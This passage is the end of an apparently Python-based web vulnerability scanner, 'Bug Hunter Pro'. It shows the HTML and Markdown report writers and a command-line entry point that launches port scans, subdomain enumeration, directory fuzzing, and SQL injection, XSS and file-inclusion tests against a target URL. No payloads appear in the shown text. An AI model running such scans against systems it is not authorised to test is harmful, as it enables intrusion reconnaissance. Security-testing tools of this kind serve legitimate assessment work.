            vulns_html += f"""
<div class="vuln" style="border-left: 5px solid {color};">
    <h3>[{v.severity}] {v.vuln_type}</h3>
    <p><b>URL:</b> <code>{html.escape(v.url)}</code></p>
    <p><b>Parameter:</b> <code>{html.escape(v.parameter)}</code></p>
    <p><b>Payload:</b> <code>{html.escape(v.payload)}</code></p>
    <p><b>CVSS:</b> {v.cvss}</p>
    <p><b>Evidence:</b> {html.escape(v.evidence)}</p>
    <p><b>Description:</b> {html.escape(v.description)}</p>
    <p><b>Remediation:</b> {html.escape(v.remediation)}</p>
    <p><b>Time:</b> {v.timestamp}</p>
</div>"""
        html_content = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Bug Hunter Report - {html.escape(self.result.target)}</title>
<style>
body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }}
h1 {{ color: #ff0040; text-align: center; border: 2px solid #ff0040; padding: 20px; }}
h2 {{ color: #ffaa00; border-bottom: 2px solid #ffaa00; padding-bottom: 5px; }}
.vuln {{ background: #1a1a1a; margin: 15px 0; padding: 15px; border-radius: 5px; }}
code {{ background: #2a2a2a; padding: 2px 8px; color: #00ffff; }}
.summary {{ background: #1a1a1a; padding: 20px; border: 1px solid #00ff00; margin: 20px 0; }}
</style></head><body>
<h1>🐛 BUG HUNTER PRO - SECURITY REPORT</h1>
<div class="summary">
<h2>Target Information</h2>
<p><b>Target:</b> {html.escape(self.result.target)}</p>
<p><b>Scan Start:</b> {self.result.start_time}</p>
<p><b>Scan End:</b> {self.result.end_time}</p>
<p><b>WAF:</b> {self.result.waf or 'None'}</p>
<p><b>Technologies:</b> {', '.join(self.result.technologies) or 'None'}</p>
<p><b>Open Ports:</b> {self.result.open_ports}</p>
<p><b>Subdomains Found:</b> {len(self.result.subdomains)}</p>
<p><b>Total Vulnerabilities:</b> {len(self.result.vulnerabilities)}</p>
</div>
<h2>Vulnerabilities</h2>
{vulns_html}
</body></html>"""
        with open(filename, "w") as f:
            f.write(html_content)

    def generate_md_report(self, filename):
        with open(filename, "w") as f:
            f.write(f"# 🐛 Bug Hunter Pro - Security Report\n\n")
            f.write(f"## Target: {self.result.target}\n\n")
            f.write(f"- **Scan Start:** {self.result.start_time}\n")
            f.write(f"- **Scan End:** {self.result.end_time}\n")
            f.write(f"- **WAF:** {self.result.waf or 'None'}\n")
            f.write(f"- **Technologies:** {', '.join(self.result.technologies) or 'None'}\n")
            f.write(f"- **Open Ports:** {self.result.open_ports}\n")
            f.write(f"- **Subdomains:** {len(self.result.subdomains)}\n")
            f.write(f"- **Vulnerabilities:** {len(self.result.vulnerabilities)}\n\n")
            f.write(f"## Vulnerabilities\n\n")
            for i, v in enumerate(self.result.vulnerabilities, 1):
                f.write(f"### {i}. [{v.severity}] {v.vuln_type}\n")
                f.write(f"- **URL:** `{v.url}`\n")
                f.write(f"- **Parameter:** `{v.parameter}`\n")
                f.write(f"- **Payload:** `{v.payload}`\n")
                f.write(f"- **CVSS:** {v.cvss}\n")
                f.write(f"- **Evidence:** {v.evidence}\n")
                f.write(f"- **Description:** {v.description}\n")
                f.write(f"- **Remediation:** {v.remediation}\n\n")


# ============================================================
# CLI
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="Bug Hunter Pro - Advanced Bug Hunting Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-d", "--deep", action="store_true", help="Deep scan mode")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads")
    parser.add_argument("-o", "--output", default="reports", help="Output directory")
    parser.add_argument("--sql", action="store_true", help="Test only SQLi")
    parser.add_argument("--xss", action="store_true", help="Test only XSS")
    parser.add_argument("--lfi", action="store_true", help="Test only LFI")
    parser.add_argument("--ports", action="store_true", help="Port scan only")
    parser.add_argument("--subdomains", action="store_true", help="Subdomain enum only")
    parser.add_argument("--fuzz", action="store_true", help="Directory fuzzing only")
    args = parser.parse_args()

    if args.ports:
        host = urllib.parse.urlparse(normalize_url(args.url)).hostname
        result = port_scan(host)
        print(json.dumps({str(k): v for k, v in result.items()}, indent=2))
    elif args.subdomains:
        host = urllib.parse.urlparse(normalize_url(args.url)).hostname
        result = enumerate_subdomains(host)
        print(json.dumps(result, indent=2))
    elif args.fuzz:
        result = dir_fuzz(normalize_url(args.url))
        for r in result:
            print(f"{r[0]} - Status: {r[1]} - Size: {r[2]}")
    elif args.sql:
        url = normalize_url(args.url)
        params = extract_params(url, make_request(url).text if make_request(url) else "")
        vulns = test_sqli(url, params)
        for v in vulns:
            print(json.dumps(asdict(v), indent=2))
    elif args.xss:
        url = normalize_url(args.url)
        params = extract_params(url, make_request(url).text if make_request(url) else "")
        vulns = test_xss(url, params)
        for v in vulns:
            print(json.dumps(asdict(v), indent=2))
    elif args.lfi:
        url = normalize_url(args.url)
        params = extract_params(url, make_request(url).text if make_request(url) else "")
        vulns = test_lfi(url, params)
        for v in vulns:
            print(json.dumps(asdict(v), indent=2))
    else:
        scanner = BugHunter(args.url, threads=args.threads, deep=args.deep, output_dir=args.output)
        scanner.run()


if __name__ == "__main__":
    main()
